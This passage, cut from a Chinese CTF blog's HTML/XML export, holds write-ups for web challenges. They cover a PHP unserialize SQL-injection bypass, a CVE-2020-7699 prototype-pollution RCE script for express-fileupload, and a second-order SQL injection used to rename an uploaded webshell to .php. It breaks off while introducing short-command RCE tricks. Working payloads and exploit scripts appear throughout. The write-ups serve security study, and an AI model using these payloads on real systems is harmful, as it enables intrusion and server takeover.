class="string">&quot;\\&quot;</span>, <span class="string">&quot;]&quot;</span> , <span class="string">&quot;*&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>];</span><br><span class="line">    	<span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">    		<span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$value</span>))&#123;</span><br><span class="line">    			<span class="keyword">die</span>(<span class="string">&#x27;bad hacker,go out!&#x27;</span>);</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$value</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;bad hacker,go out!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$this</span>-&gt;password, <span class="variable">$value</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;bad hacker,go out!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="variable language_">$this</span>-&gt;conn)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span> ();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;table)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">waf</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_login</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里可以看到sql查询语句只要用户名是admin就可以输出flag的值</p>
<p>而ip.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br></pre></td></tr></table></figure>
<p>就算来告诉你你的ip是多少的</p>
<h4 id="官方"><a href="#官方" class="headerlink" title="官方:"></a>官方:</h4><p>正常官方的wp是绕过ip的限制和用子查询来造成SQL查询语句为真(并且用户名是admin)来输出flag的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQL</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$table</span> = <span class="string">&#x27;(select \&#x27;admin\&#x27; username,\&#x27;123\&#x27; password)a&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base64_encode</span> (<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;ip&#x27;</span> =&gt; <span class="string">&#x27;182.150.122.62&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;sql&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title function_ invoke__">SQL</span>(),</span><br><span class="line">))));</span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231130000325.png" alt="Pasted image 20231130000325.png"></p>
<p>这里SQL语句:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username,password from (select &#x27;admin&#x27; username,&#x27;123&#x27; password) where username=admin and password=123;</span><br></pre></td></tr></table></figure>
<p>生成了一个临时的虚拟表:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username  password</span><br><span class="line">  admin     123</span><br></pre></td></tr></table></figure>
<p>where语句使得查询语句为真,username又是admin刚好符合输出flag的条件</p>
<h4 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h4><p>这里ip其实可以不用绕过,我们构造的类只有一个不是数组就行<br>比如:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQL</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$table</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;table=<span class="string">&#x27;(select \&#x27;admin\&#x27; username,\&#x27;123\&#x27; password)a&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">SQL</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>又或者不用子查询,直接万能密码绕过,因为这里黑名单没有过滤单引号,而他的SQL语句又是单引号拼接的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQL</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$table</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;table=<span class="string">&#x27;users&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&quot;&#x27;or &#x27;1&#x27;=&#x27;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">SQL</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231130000845.png" alt="Pasted image 20231130000845.png"></p>
<h3 id="BadProgrammer"><a href="#BadProgrammer" class="headerlink" title="BadProgrammer"></a>BadProgrammer</h3><p>页面一些东西都点不了,这里dirsearch扫目录只扫出来一个static文件夹<br>抓包看到<code>X-Powered-By: Express</code>,看了别人的wp发现利用的nginx配置错误</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:53853/static../</span><br></pre></td></tr></table></figure>
<p>从而可以列出文件目录<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231130142957.png" alt="Pasted image 20231130142957.png"></p>
<p>app.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileUpload = <span class="built_in">require</span>(<span class="string">&#x27;express-fileupload&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">fileUpload</span>(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/4_pATh_y0u_CaNN07_Gu3ss&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;flag.ejs&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index.ejs&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br><span class="line">app.<span class="title function_">on</span>(<span class="string">&#x27;listening&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Express server started on port %s at %s&#x27;</span>, server.<span class="title function_">address</span>().<span class="property">port</span>, server.<span class="title function_">address</span>().<span class="property">address</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>我们在package.json里看到了<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231130143431.png" alt="Pasted image 20231130143431.png"></p>
<p>我们搜一下express-fileupload 1.1.7-alpha.4就看到了一个CVE-2020-7699</p>
<p>这里看懂原理但是构造的payload没打出来,看了别人的wp发现:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://61.147.171.105:53853/4_pATh_y0u_CaNN07_Gu3ss&#x27;</span></span><br><span class="line">files=&#123;</span><br><span class="line">    <span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>:</span><br><span class="line">        (<span class="literal">None</span>,<span class="string">&quot;x;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;cp /flag.txt /app/static/js/flag1.txt&#x27;);x&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">res=requests.post(url=url,files=files)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231130153032.png" alt="Pasted image 20231130153032.png"></p>
<h3 id="filemanager"><a href="#filemanager" class="headerlink" title="filemanager"></a>filemanager</h3><p>考点:update二次注入<br>首先信息搜集,dirsearch扫一下<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231202010954.png" alt="image.png"><br>/www.tar.gz得到源码,我们重点看upload.php和rename.php<br>upload.php:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: phithon</span></span><br><span class="line"><span class="comment"> * Date: 15/10/14</span></span><br><span class="line"><span class="comment"> * Time: 下午8:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.inc.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>) &#123;</span><br><span class="line">	<span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;upfile&quot;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&quot;error&quot;</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">		<span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">		<span class="variable">$path_parts</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>], <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;zip&quot;</span>, <span class="string">&quot;txt&quot;</span>))) &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">&quot;error extension&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>] = <span class="string">&quot;.&quot;</span> . <span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="variable">$name</span> = <span class="variable">$path_parts</span>[<span class="string">&quot;filename&quot;</span>] . <span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// $path_parts[&quot;filename&quot;] = $db-&gt;quote($path_parts[&quot;filename&quot;]);</span></span><br><span class="line">		<span class="comment">// Fix</span></span><br><span class="line">		<span class="variable">$path_parts</span>[<span class="string">&#x27;filename&#x27;</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$path_parts</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$path_parts[&#x27;filename&#x27;]&#125;</span>&#x27; and `extension`=&#x27;<span class="subst">&#123;$path_parts[&#x27;extension&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$fetch</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">&quot;file is exists&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>], UPLOAD_DIR . <span class="variable">$name</span>)) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="variable">$sql</span> = <span class="string">&quot;insert into `file` ( `filename`, `view`, `extension`) values( &#x27;<span class="subst">&#123;$path_parts[&#x27;filename&#x27;]&#125;</span>&#x27;, 0, &#x27;<span class="subst">&#123;$path_parts[&#x27;extension&#x27;]&#125;</span>&#x27;)&quot;</span>;</span><br><span class="line">			<span class="variable">$re</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span> (!<span class="variable">$re</span>) &#123;</span><br><span class="line">				<span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">				<span class="keyword">exit</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$url</span> = <span class="string">&quot;/&quot;</span> . UPLOAD_DIR . <span class="variable">$name</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;Your file is upload, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;<span class="subst">&#123;$url&#125;</span>\&quot; target=&#x27;_blank&#x27;&gt;<span class="subst">&#123;$url&#125;</span>&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;/\&quot;&gt;go back&lt;/a&gt;&quot;</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">&quot;upload error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">error_get_last</span>());</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要功能是对上传的文件的文件名进入处理,先隔开扩展名匹配一下白名单,然后分开filename和extension插入file表里,其中还有一些检验,比如检查文件是否已经存在,filename做了转义函数处理</p>
<p>rename.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: phithon</span></span><br><span class="line"><span class="comment"> * Date: 15/10/14</span></span><br><span class="line"><span class="comment"> * Time: 下午9:39</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.inc.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$req</span>[<span class="string">&#x27;oldname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$req[&#x27;oldname&#x27;]&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">&quot;old file doesn&#x27;t exists!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>] = <span class="title function_ invoke__">basename</span>(<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>]);</span><br><span class="line">		<span class="variable">$re</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;update `file` set `filename`=&#x27;<span class="subst">&#123;$req[&#x27;newname&#x27;]&#125;</span>&#x27;, `oldname`=&#x27;<span class="subst">&#123;$result[&#x27;filename&#x27;]&#125;</span>&#x27; where `fid`=<span class="subst">&#123;$result[&#x27;fid&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (!<span class="variable">$re</span>) &#123;</span><br><span class="line">			<span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$oldname</span> = UPLOAD_DIR . <span class="variable">$result</span>[<span class="string">&quot;filename&quot;</span>] . <span class="variable">$result</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">		<span class="variable">$newname</span> = UPLOAD_DIR . <span class="variable">$req</span>[<span class="string">&quot;newname&quot;</span>] . <span class="variable">$result</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$oldname</span>)) &#123;</span><br><span class="line">			<span class="title function_ invoke__">rename</span>(<span class="variable">$oldname</span>, <span class="variable">$newname</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$url</span> = <span class="string">&quot;/&quot;</span> . <span class="variable">$newname</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Your file is rename, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;<span class="subst">&#123;$url&#125;</span>\&quot; target=&#x27;_blank&#x27;&gt;<span class="subst">&#123;$url&#125;</span>&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;/\&quot;&gt;go back&lt;/a&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;file manage&lt;/title&gt;</span><br><span class="line">    &lt;base href=<span class="string">&quot;/&quot;</span>&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h3&gt;Rename&lt;/h3&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        &lt;span&gt;old <span class="title function_ invoke__">filename</span>(exclude extension)：&lt;/span&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;oldname&quot;</span>&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        &lt;span&gt;<span class="keyword">new</span> <span class="title function_ invoke__">filename</span>(exclude extension)：&lt;/span&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;newname&quot;</span>&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;rename&quot;</span>&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里SQL语句还是单引号直接拼接的,主要功能是先检查要修改的文件名是否已经存在,然后修改file表对应行数据的两个字段的值,newname是我们传入的,oldname是数据库里面的(和我们传入的filename做了select查询的结果)</p>
<p>思路:<br>我们肯定是要把白名单后缀的文件改成php后缀的文件的,但是这里创建了一个file表把每个文件的文件名和后缀的数据给分开存储起来了,我们就算运行rename.php也只能修改文件名,文件后缀还是不变的,因此我们需要利用SQL语句的拼接闭合来完成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update `file` set `filename`=&#x27;&#123;$req[&#x27;newname&#x27;]&#125;&#x27;, `oldname`=&#x27;&#123;$result[&#x27;filename&#x27;]&#125;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;</span><br></pre></td></tr></table></figure>
<p>这里可以控制oldname的值来让extension为空,比如<code>&#39;,extension=&#39;</code>,<br>但是这里重命名文件会检查文件是否存在<code>if (file_exists($oldname))</code><br>我们可以通过上传一个同名文件绕过</p>
<p>先上传<code>&#39;,extension=&#39;.txt</code>,内容随便写,此时file表的filename是<code>&#39;,extension=&#39;</code>,extension是txt<br>然后修改文件名:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231202014809.png" alt="image.png"></p>
<p>此时本来新文件名是test.txt,后缀是txt,经过update语句,==file表中filename是test.txt,extension为空,oldname也是空==</p>
<p>oldname和newname值不一样,<code>$oldname</code>是’,extension=’.txt,而newname是test.txt.txt,此时php文件系统路径是test.txt.txt</p>
<p>此时上传一个test.txt,内容就是一句话木马<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231202015116.png" alt="image.png"></p>
<p>最后把test.txt改为test.php,因为extension已经是空了<br>==这里的关键是if的绕过,<code>$result[&quot;filename&quot;]=test.txt</code>,,<code>$result[&quot;extension&quot;]=空</code>,而<code>$oldname = UPLOAD_DIR . $result[&quot;filename&quot;] . $result[&quot;extension&quot;];</code>,这里本来文件系统路径是test.txt.txt的我们这里是test.txt是无法rename()的但是我们后来上传了一个test.txt从而让if语句为真,成功重命名为test.php==</p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231202015141.png" alt="image.png"></p>
<p>此时oldname是test.txt,newname是test.php,extension是空</p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231202015151.png" alt="image.png"></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231202020207.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>玩转(爆搓)超短RCE</title>
    <url>/2023/11/08/%E7%8E%A9%E8%BD%AC%E8%B6%85%E7%9F%ADRCE-1/</url>
    <content><![CDATA[<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>几个Linux命令需要了解一下:</p>
<ul>
<li><blockquote>
<p>可以写文件,比如&gt;test就新建一个test名字的文件</p>
</blockquote>
</li>
<li>ls -t可以把文件按照创建时间来排序</li>
<li>dir可以执行ls命令并且不换行输出</li>
</ul>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/1.png" alt="1.png"></p>
<ul>
<li><code>*</code>:可以把ls列出来的第一个文件名当成命令,剩下的文件名当作参数,==相当于`ls`==</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;id</span><br><span class="line">&gt;root</span><br><span class="line">&gt;*</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"></span><br><span class="line">还可以通过在*左右添加字母来选择命令</span><br></pre></td></tr></table></figure>
<ul>
<li>rev倒置</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;rev</span><br><span class="line">echo 1234 &gt; v</span><br><span class="line">*v</span><br></pre></td></tr></table></figure>
<p>这里<code>*v</code>指定了参数</p>
<h3 id="7字符RCE"><a href="#7字符RCE" class="headerlink" title="7字符RCE"></a>7字符RCE</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/var/www/html/sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">7</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span 